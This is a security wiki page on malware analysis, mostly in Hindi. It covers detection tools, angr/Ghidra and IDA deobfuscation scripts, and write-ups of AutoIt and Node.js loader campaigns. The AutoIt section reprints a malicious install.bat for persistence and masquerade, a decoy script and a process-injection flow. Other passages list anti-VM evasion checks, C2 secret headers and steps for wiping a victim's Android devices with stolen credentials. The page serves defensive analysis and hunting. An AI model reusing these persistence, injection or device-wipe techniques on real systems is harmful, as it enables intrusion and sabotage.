# Malware विश्लेषण

{{#include ../../banners/hacktricks-training.md}}

## Forensics चीटशीट्स

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## ऑनलाइन सेवाएँ

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## ऑफ़लाइन Antivirus और Detection Tools

### Yara

#### इंस्टॉल
```bash
sudo apt-get install -y yara
```
#### नियम तैयार करें

इस स्क्रिप्ट का उपयोग github से सभी yara malware rules को डाउनलोड और मर्ज करने के लिए करें: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\  
_**rules**_ डिरेक्टरी बनाएं और इसे चलाएँ। यह _**malware_rules.yar**_ नाम की एक फ़ाइल बनाएगा जो malware के लिए सभी yara rules को शामिल करती है।
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### स्कैन
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: malware के लिए जांच और नियम बनाना

आप [**YaraGen**](https://github.com/Neo23x0/yarGen) टूल का उपयोग किसी binary से yara rules जनरेट करने के लिए कर सकते हैं। इन ट्यूटोरियल्स को देखें: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### इंस्टॉल
```
sudo apt-get install -y clamav
```
#### स्कैन
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** संभावित रूप से खतरनाक **capabilities** को executables: PE, ELF, .NET में पहचानता है। इसलिए यह चीज़ें ढूँढेगा जैसे कि Att\&ck tactics, या संदेहास्पद capabilities जैसे:

- OutputDebugString error की जाँच
- सर्विस के रूप में चलना
- प्रोसेस बनाना

इसे [**Github repo**](https://github.com/mandiant/capa) में प्राप्त करें।

### IOCs

IOC का मतलब Indicator Of Compromise है। IOC उन **पहचान करने की शर्तों** का एक सेट है जो कुछ संभावित अवांछित सॉफ़्टवेयर या पुष्ट **malware** की पहचान करते हैं। Blue Teams इस तरह की परिभाषा का उपयोग अपने **सिस्टम्स** और **नेटवर्क्स** में ऐसे **malicious files** की **खोज** के लिए करते हैं।\
इन परिभाषाओं को साझा करना बहुत उपयोगी है क्योंकि जब किसी कंप्यूटर में malware पहचाना जाता है और उसके लिए एक IOC बनाया जाता है, तो अन्य Blue Teams इसे तेजी से malware पहचानने के लिए उपयोग कर सकती हैं।

IOCs बनाने या संशोधित करने का एक उपकरण [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
आप [**Redline**](https://www.fireeye.com/services/freeware/redline.html) जैसे टूल्स का उपयोग किसी डिवाइस में परिभाषित IOCs को **खोजने के लिए** कर सकते हैं।

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) Simple Indicators of Compromise के लिए एक scanner है।\
Detection चार तरीकों पर आधारित है:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) Linux के लिए एक malware स्कैनर है जो GNU GPLv2 license के अंतर्गत जारी किया गया है, और इसे shared hosted environments में सामना होने वाले खतरों के अनुसार डिज़ाइन किया गया है। यह network edge intrusion detection systems से threat डेटा का उपयोग करके उन malware को निकालता है जो सक्रिय रूप से हमलों में उपयोग हो रहे हैं और detection के लिए signatures जेनरेट करता है। इसके अलावा, threat डेटा LMD checkout feature के माध्यम से user submissions और malware community resources से भी प्राप्त होता है।

### rkhunter

Tools like [**rkhunter**](http://rkhunter.sourceforge.net) का उपयोग फ़ाइल सिस्टम की संभावित **rootkits** और malware के लिए जाँच करने में किया जा सकता है।
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) एक टूल है जो विभिन्न तकनीकों का उपयोग करके executables के अंदर obfuscated strings खोजने की कोशिश करता है।

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper)कुछ बेसिक चीज़ें executable के अंदर जांचता है (binary data, entropy, URLs and IPs, कुछ yara rules)।

### PEstudio

[PEstudio](https://www.winitor.com/download) एक टूल है जो Windows executables की जानकारी प्राप्त करने की अनुमति देता है जैसे imports, exports, headers, और साथ ही virus total की जांच भी करेगा और संभावित Att\&ck techniques खोजेगा।

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) एक ऐसा टूल है जो पता लगाने के लिए कि कोई फ़ाइल **encrypted** है या नहीं और साथ ही **packers** भी ढूँढता है।

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is एक Python script है जो text/script files के भीतर **obfuscated** और **encrypted** content का पता लगाने के लिए विभिन्न **statistical methods** का उपयोग करता है। NeoPI का उद्देश्य **detection of hidden web shell code** में मदद करना है।

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) अपनी पूरी कोशिश करता है **obfuscated**/**dodgy code** का पता लगाने के लिए और उन फाइलों को भी जो अक्सर **malwares**/webshells में उपयोग होने वाले **PHP** functions का उपयोग करती हैं।

### Apple Binary Signatures

जब आप किसी **malware sample** की जांच कर रहे हों तो आपको हमेशा binary के **signature** को **check** करना चाहिए क्योंकि जिसने इसे sign किया है वह **developer** पहले से ही **related** हो सकता है **malware** से।
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Detection Techniques

### File Stacking

If you know that some folder containing the **files** of a web server was **last updated on some date**. **Check** the **date** all the **files** in the **web server were created and modified** and if any date is **suspicious**, check that file.

यदि आप जानते हैं कि किसी फ़ोल्डर में वेब सर्वर की **फ़ाइलें** किसी विशेष तारीख़ को **अंतिम बार अपडेट** की गई थीं, तो उस वेब सर्वर की सभी **फ़ाइलों** की **निर्माण** और **संशोधन** तिथियों की जाँच करें — और यदि कोई तिथि **संदिग्ध** लगे तो उस फ़ाइल की जाँच करें।

### Baselines

If the files of a folder **shouldn't have been modified**, you can calculate the **hash** of the **original files** of the folder and **compare** them with the **current** ones. Anything modified will be **suspicious**.

यदि किसी फ़ोल्डर की फ़ाइलें **बदलनी नहीं चाहिए थीं**, तो आप उस फ़ोल्डर की **original files** का **hash** निकालकर उन्हें **current** फ़ाइलों से **compare** कर सकते हैं। जो भी फ़ाइलें बदली हुई मिलेंगी वे **संदिग्ध** मानी जाएँगी।

### Statistical Analysis

When the information is saved in logs you can **check statistics like how many times each file of a web server was accessed as a web shell might be one of the most**.

जब जानकारी लॉग्स में संग्रहीत हो, आप सांख्यिकी जाँच सकते हैं — जैसे प्रत्येक वेब सर्वर फ़ाइल को कितनी बार एक्सेस किया गया; क्योंकि एक web shell संभवतः सबसे अधिक एक्सेस की जाने वाली फ़ाइलों में से एक हो सकती है।

---

### Android in-app native telemetry (no root)

On Android, you can instrument native code inside the target app process by preloading a tiny logger library before other JNI libs initialize. This gives early visibility into native behavior without system-wide hooks or root. A popular approach is SoTap: drop libsotap.so for the right ABI into the APK and inject a System.loadLibrary("sotap") call early (e.g., static initializer or Application.onCreate), then collect logs from internal/external paths or Logcat fallback.

Android पर, आप target app process के अंदर native code को instrument कर सकते हैं — अन्य JNI लाइब्रेरीज़ initialize होने से पहले एक छोटा logger library preload करके। इससे system-wide hooks या root के बिना भी native व्यवहार की शुरुआती दृश्यता मिलती है। एक लोकप्रिय तरीका SoTap है: सही ABI के लिए libsotap.so को APK में डालें और जल्दी से System.loadLibrary("sotap") कॉल inject करें (उदाहरण के लिए static initializer या Application.onCreate), फिर internal/external paths या Logcat fallback से logs एकत्र करें।

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Some Android malware and RASP-protected apps hide JNI method names and signatures by decoding them at runtime before calling RegisterNatives. When Frida/ptrace instrumentation is killed by anti-debug, you can still recover the plaintext offline by executing the in-binary decoder with angr and then pushing results back into Ghidra as comments.

कुछ Android malware और RASP‑protected apps JNI method नामों और signatures को RegisterNatives कॉल करने से पहले runtime पर decode करके छिपाते हैं। जब anti-debug के कारण Frida/ptrace instrumentation काम करना बंद कर देता है, तब भी आप इन‑बाइनरी decoder को angr से ऑफ़लाइन execute करके plaintext पुनः प्राप्त कर सकते हैं और परिणामों को Ghidra में comments के रूप में push कर सकते हैं।

Key idea: treat the decoder inside the .so as a callable function, execute it on the obfuscated byte blobs in .rodata, and concretize the output bytes up to the first \x00 (C-string terminator). Keep angr and Ghidra using the same image base to avoid address mismatches.

मुख्य विचार: .so के अंदर मौजूद decoder को एक callable function मानें, उसे .rodata में मौजूद obfuscated byte blobs पर चलाएँ, और पहले \x00 (C-string terminator) तक के output bytes को concretize करें। address mismatches से बचने के लिए angr और Ghidra दोनों में वही image base रखें।

Workflow overview
- Triage in Ghidra: identify the decoder and its calling convention/arguments in JNI_OnLoad and RegisterNatives setup.
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Workflow का अवलोकन
- Ghidra में ट्रायज: JNI_OnLoad और RegisterNatives सेटअप में decoder और उसकी calling convention/arguments पहचानें।
- angr (CPython3) चलाएँ ताकि प्रत्येक target string के लिए decoder execute कर सकें और results dump कर सकें।
- Ghidra में annotate करें: तेज JNI reconstruction के लिए प्रत्येक call site पर decoded strings को auto‑comment करें।

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

Ghidra triage (JNI_OnLoad pattern)
- JNI_OnLoad पर JNI datatypes लागू करें ताकि Ghidra JNINativeMethod structures को पहचान सके।
- Oracle docs के अनुसार सामान्य JNINativeMethod:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

- RegisterNatives कॉल्स की तलाश करें। यदि लाइब्रेरी नाम/सिग्नेचर को एक स्थानीय routine (उदा. FUN_00100e10) से बनाती है जो किसी static byte table (उदा. DAT_00100bf4) को संदर्भित करती है और (encoded_ptr, out_buf, length) जैसे पैरामीटर लेती है, तो वह ऑफ़लाइन execution के लिए उपयुक्त लक्ष्य है।

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

angr setup (decode को ऑफ़लाइन execute करना)
- Ghidra में उपयोग किए गए वही base (उदा. 0x00100000) के साथ .so लोड करें और state को छोटा रखने के लिए external libs का auto‑loading disable करें।

<details>
<summary>angr setup and offline decoder execution</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- बड़े पैमाने पर, call sites का एक static मैप बनाएं जो decoder के arguments (encoded_ptr, size) को दर्शाता है। Wrappers arguments छिपा सकते हैं, इसलिए यदि API recovery noisy हो तो आप यह mapping मैन्युअली Ghidra xrefs से बना सकते हैं।

<details>
<summary>Batch decode multiple call sites with angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ghidra में call sites को एनोटेट करें
विकल्प A: Jython-only comment writer (pre-computed JSON का उपयोग करें)
- चूँकि angr को CPython3 चाहिए, इसलिए deobfuscation और annotation को अलग रखें। पहले ऊपर दिया गया angr script चलाकर decoded_strings.json बनायें। फिर यह Jython GhidraScript चलाकर प्रत्येक call site पर PRE_COMMENTs लिखें (और संदर्भ के लिए caller function name शामिल करें):

<details>
<summary>Ghidra Jython script decoded JNI strings को annotate करने के लिए</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Option B: एकल CPython स्क्रिप्ट pyhidra/ghidra_bridge के माध्यम से
- वैकल्पिक रूप से, pyhidra या ghidra_bridge का उपयोग करके उसी CPython प्रक्रिया से Ghidra की API को ड्राइव करें जो angr चला रही है। इससे आप decode_string() कॉल कर सकते हैं और एक मध्यवर्ती फ़ाइल के बिना तुरंत PRE_COMMENTs सेट कर सकते हैं। तर्क Jython स्क्रिप्ट को प्रतिबिंबित करता है: ReferenceManager के माध्यम से callsite→function मैप बनाएं, angr के साथ decode करें, और कमेंट सेट करें।

Why this works and when to use it
- Offline execution RASP/anti-debug को दरकिनार करता है: strings पुनः प्राप्त करने के लिए ptrace या Frida hooks की आवश्यकता नहीं।
- Ghidra और angr का base_addr संरेखित रखना (उदाहरण: 0x00100000) सुनिश्चित करता है कि function/data addresses उपकरणों के बीच मेल खाते हैं।
- Decoders के लिए दोहराने योग्य रेसिपी: transform को एक pure function की तरह मानें, एक output buffer नए state में allocate करें, इसे (encoded_ptr, out_ptr, len) के साथ कॉल करें, फिर state.solver.eval के माध्यम से concretize करें और C-strings को \x00 तक parse करें।

Notes and pitfalls
- लक्षित ABI/calling convention का सम्मान करें। angr.factory.callable arch के आधार पर एक चुनता है; यदि arguments shifted दिखते हैं, तो cc स्पष्ट रूप से निर्दिष्ट करें।
- यदि decoder zeroed output buffers की अपेक्षा करता है, तो कॉल से पहले state में outbuf को zeros से initialize करें।
- position-independent Android .so के लिए, हमेशा base_addr प्रदान करें ताकि angr में पते Ghidra में देखे गए पते से मेल खाएँ।
- भले ही app decoder को thin stubs के पीछे wrap करे, तब भी call-xrefs enumerate करने के लिए currentProgram.getReferenceManager() का उपयोग करें।

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Dynamic Control-Flow (JMP/CALL RAX Dispatchers) को Deobfuscate करना

आधुनिक malware परिवार Control-Flow Graph (CFG) obfuscation का भारी दुरुपयोग करते हैं: सीधे jump/call के बजाय वे run-time पर destination compute करते हैं और `jmp rax` या `call rax` execute करते हैं। एक छोटा *dispatcher* (आमतौर पर नौ निर्देश) CPU के `ZF`/`CF` flags पर निर्भर करके final target सेट करता है, जिससे static CFG recovery पूरी तरह टूट जाती है।

यह तकनीक – SLOW#TEMPEST loader द्वारा प्रदर्शित – को एक तीन-स्टेप workflow से हराया जा सकता है जो केवल IDAPython और Unicorn CPU emulator पर निर्भर करता है।

### 1. हर indirect jump / call ढूँढें
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. dispatcher byte-code निकालें
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. इसे Unicorn के साथ दो बार emulate करें
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
`run(code,0,0)` और `run(code,1,1)` चलाएँ ताकि *false* और *true* branch targets प्राप्त हो सकें।

### 4. एक direct jump / call को वापस पैच करें
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
पैच करने के बाद, IDA को फ़ंक्शन का पुनः विश्लेषण करने के लिए मजबूर करें ताकि पूरा CFG और Hex-Rays आउटपुट बहाल हो जाए:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. अप्रत्यक्ष API कॉल्स को लेबल करें

एक बार जब हर `call rax` का वास्तविक गंतव्य ज्ञात हो जाए आप IDA को बता सकते हैं ताकि पैरामीटर प्रकार और वेरिएबल नाम स्वतः पुनर्प्राप्त हो जाएँ:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### व्यावहारिक लाभ

* वास्तविक CFG को पुनर्स्थापित करता है → decompilation *10* लाइनों से हजारों तक चली जाती है।
* string-cross-reference & xrefs सक्षम करता है, जिससे व्यवहार का पुनर्निर्माण सरल हो जाता है।
* Scripts पुनः उपयोग योग्य हैं: इन्हें किसी भी loader में डालें जो उसी trick से protected हो।

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

यह intrusion pattern एक signed MSI, AutoIt loaders (.a3x में compile किए गए), और एक Task Scheduler job को chain करता है जो एक benign app के रूप में masquerade करता है।

### MSI → custom actions → AutoIt orchestrator

MSI custom actions द्वारा execute किए गए process tree और commands:

- MsiExec.exe → cmd.exe, install.bat को चलाने के लिए
- WScript.exe, एक भ्रामक त्रुटि संवाद दिखाने के लिए
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (drops loader, sets persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (उपयोगकर्ता डेकोय):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
प्रमुख साक्ष्य और छद्माकरण:
- Drops AutoIt3.exe and IoKlTr.au3 to C:\Users\Public\Music
- Copies schtasks.exe to hwpviewer.exe (masquerades as Hangul Word Processor viewer)
- Creates a scheduled task "IoKlTr" that runs every 1 minute
- Startup LNK seen as Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Stages modules under %APPDATA%\Google\Browser\ subfolders containing `adb` or `adv` and starts them via autoit.vbs/install.bat helpers

फॉरेंसिक ट्रायेज सुझाव:
- schtasks का एन्यूमरेशन: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Task XML के साथ सह-स्थित schtasks.exe की नाम बदली हुई प्रतियां देखें: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- सामान्य पथ: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- प्रोसेस निर्माण का सहसंबंध करें: AutoIt3.exe द्वारा वैध Windows binaries (e.g., cleanmgr.exe, hncfinder.exe) का उत्पन्न होना

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt modules are compiled with `#AutoIt3Wrapper_Outfile_type=a3x` and decrypt embedded payloads before injecting into benign processes.
- Observed families: QuasarRAT (injected into hncfinder.exe) and RftRAT/RFTServer (injected into cleanmgr.exe), as well as RemcosRAT modules (`Remcos\RunBinary.a3x`).
- Decryption pattern: derive an AES key via HMAC, decrypt the embedded blob, then inject the plaintext module.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) of the target host (e.g., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory with decrypted module/shellcode
- CreateRemoteThread or QueueUserAPC to execute payload

Hunting ideas
- AutoIt3.exe parented by MsiExec.exe or WScript.exe spawning system utilities
- Files with `.a3x` extensions or AutoIt script runners under public/user-writable paths
- Suspicious scheduled tasks executing AutoIt3.exe or binaries not signed by Microsoft, with minute-level triggers

### Account-takeover abuse of Android Find My Device (Find Hub)

Windows intrusion के दौरान, operators ने चोरी किए गए Google credentials का उपयोग करके पीड़ित के Android devices को बार-बार wipe किया, और notifications को suppress करते हुए पीड़ित के logged-in desktop messenger के माध्यम से access बढ़ाया।

Operator steps (from a logged-in browser session):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: linked mailbox (e.g., Naver) में alert e-mails साफ़ करें ताकि security notifications छिप जाएँ

## Tracing heavily obfuscated Node.js loaders

Attackers अक्सर standalone Windows binaries में JavaScript loaders bundle करते हैं, जो [`nexe`](https://github.com/nexe/nexe) से compiled होते हैं, इसलिए runtime script के साथ ship होता है। परिणामी PE अक्सर 60–90 MB का होता है और Node.js न स्थापित होने पर भी execute हो जाता है। Triage के दौरान:

- Use [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) to carve the embedded JavaScript out of the PE and feed it to local tooling for static diffing.
- Expect a disk-based mutex in `%TEMP%` (GachiLoader drops a random `<name>.lock` file that expires after ~5 minutes). फ़ाइल को execution से पहले sandbox में copy करने से आप redundant stages skip कर सकते हैं जबकि बाद के payloads को देख पाएँगे।

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) core modules को किसी भी Node.js process के अंदर hook करता है, anti-VM probes को spoof करने देता है, और sample द्वारा लिखे गए हर artifact को preserve करता है। obfuscated scripts को tracer के माध्यम से launch करें ताकि analyst-controlled instrumentation call stack में बनी रहे:
```powershell
node -r .\tracer.js main.js
```
Key configuration toggles inside `tracer.js` allow you to:

- फ़ाइल सिस्टम, child-process, और HTTP गतिविधि लॉग करें (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`)। हर ड्रॉप की गई फ़ाइल — जैसे `kidkadi.node` — को मैलवेयर उसे हटाने से पहले वर्किंग डायरेक्टरी में कॉपी किया जाता है।
- वातावरण के फिंगरप्रिंट ओवरराइड करें: वास्तविकता के अनुरूप RAM/CPU गिनती लौटाकर, `tasklist` आउटपुट नकली बनाकर, और PowerShell/WMI प्रतिक्रियाओं के साथ छेड़छाड़ करके। यह उन loaders को बायपास करता है जो ≥4 GB RAM, ≥2 cores माँगते हैं और उपयोगकर्ता नामों (`mashinesssss`, `wdagutilityaccount`, आदि), होस्टनेम्स (`desktop-vrsqlag`, `server1` …) और प्रोसेस नामों (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`) की सख्ती से जाँच करते हैं।
- WMI हार्डवेयर चेक्स को निष्क्रिय करें जैसे `Get-WmiObject Win32_DiskDrive` (जो `vmware`, `kvm`, `virtio`, … ढूँढता है), `Win32_VideoController` (“VirtualBox Graphics Adapter”, “Hyper-V Video”, आदि को ब्लॉक करना) और `Win32_PortConnector` काउंट्स। जब वे probes "real" हार्डवेयर रिपोर्ट करते हैं, तो sandboxes अब उन अनंत Invoke-WebRequest कॉल्स के लूप में नहीं फँसते जो GachiLoader विश्लेषण समय बर्बाद करने के लिए `linkedin.com`, `grok.com`, `whatsapp.com` और समान डोमेनों पर करता है।

### Capturing gated C2 traffic automatically

tracer के network hooks JavaScript obfuscation को रिवर्स किए बिना multi-layer C2 authentication का खुलासा करते हैं। Observed campaign में loader:

1. प्रत्येक हार्ड-कोडेड C2 पर `/log` को host telemetry के रूप में POST करता है।
2. Base64-encoded payload URL प्राप्त करने के लिए `X-Secret: gachifamily` हेडर के साथ `GET /richfamily/<per-sample key>` जारी करता है।
3. उस URL पर एक अंतिम `GET` करता है जिसमें एक लंबा per-sample `X-Secret` हेडर होता है; यदि यह गायब है तो `403 Forbidden` लौटता है।

क्योंकि tracer पूर्ण requests (headers, bodies, destinations) रिकॉर्ड करता है, आप वही ट्रैफिक replay करके payloads खींच सकते हैं, Themida/VMProtect शेल्स को मेमोरी में dump कर सकते हैं, और बड़े पैमाने पर Rhadamanthys configuration डेटा निकाल सकते हैं।

## AdaptixC2: Configuration Extraction and TTPs

समर्पित पृष्ठ देखें:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: हल्का इन-ऐप JNI (.so) व्यवहार लॉगर – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Android एप्लिकेशन में Native Code का विश्लेषण करने की रणनीतियाँ: Code Decryption और Deobfuscation के लिए Ghidra और Symbolic Execution को मिलाना – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
